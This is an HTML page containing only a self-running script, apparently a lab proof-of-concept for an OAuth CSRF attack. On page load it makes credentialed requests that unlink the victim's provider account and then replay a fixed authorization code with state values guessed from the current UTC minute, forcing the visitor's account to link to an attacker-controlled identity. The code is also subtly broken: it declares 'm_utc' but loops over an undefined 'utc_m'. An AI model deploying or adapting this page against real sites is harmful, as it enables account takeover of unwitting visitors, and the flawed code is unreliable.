<!DOCTYPE html>
<html>
  <head>
  </head>
  <body>
<script>


(async ()=>{
    var client_url = "http://ptl-357e63f6-544b1c72.libcurl.so"
    var code = "8e2e8c7d5d114bb52fbe9fed73cf48ca8e7951681b4fb63c53d6565f6e78ec52"
    var state = "2021080903"

    function zeroPad(num, size) {
        num = num.toString();
        while (num.length < size) num = "0" + num;
        return num;
    }

    var d=new Date()
    var m_utc = d.getUTCMinutes()

    try {
        await fetch(client_url+"/unlink", {
            credentials: 'include'
        })
    }
    catch(e) {
        console.log("BB"+e);
    }
    for (let m=utc_m-1; m<utc_m+2; m++)
    {
        try {
            await fetch(client_url+"/users/auth/myprovider", {
                credentials: 'include'
            })
        }
        catch(e) {
            console.log("BB"+e);
        }
        try {
            await fetch(client_url+"/users/auth/myprovider/callback?code="+code+"&state="+state+zeroPad(m,2) , {
                credentials: 'include'
            })
        }
        catch(e) {
            console.log("BB"+e);
        }
    }

})();
</script>
  </body>
</html>
